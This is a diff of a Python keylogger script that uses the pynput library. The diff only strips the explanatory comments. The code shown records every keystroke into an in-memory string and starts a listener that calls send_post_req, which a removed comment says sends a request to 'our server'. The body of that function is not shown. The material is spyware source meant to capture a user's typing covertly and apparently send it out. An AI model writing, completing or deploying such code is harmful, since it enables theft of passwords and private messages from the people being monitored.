@@ -21,9 +21,6 @@ def send_post_req():
 def on_press(key):
     global text
 
-# Based on the key press we handle the way the key gets logged to the in memory string.
-# Read more on the different keys that can be logged here:
-# https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard
     if key == keyboard.Key.enter:
         text += "\n"
     elif key == keyboard.Key.tab:
@@ -41,13 +38,9 @@ def on_press(key):
     elif key == keyboard.Key.esc:
         return False
     else:
-        # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
         text += str(key).strip("'")
 
-# A keyboard listener is a threading.Thread, and a callback on_press will be invoked from this thread.
-# In the on_press function we specified how to deal with the different inputs received by the listener.
 with keyboard.Listener(
     on_press=on_press) as listener:
-    # We start of by sending the post request to our server.
     send_post_req()
     listener.join()
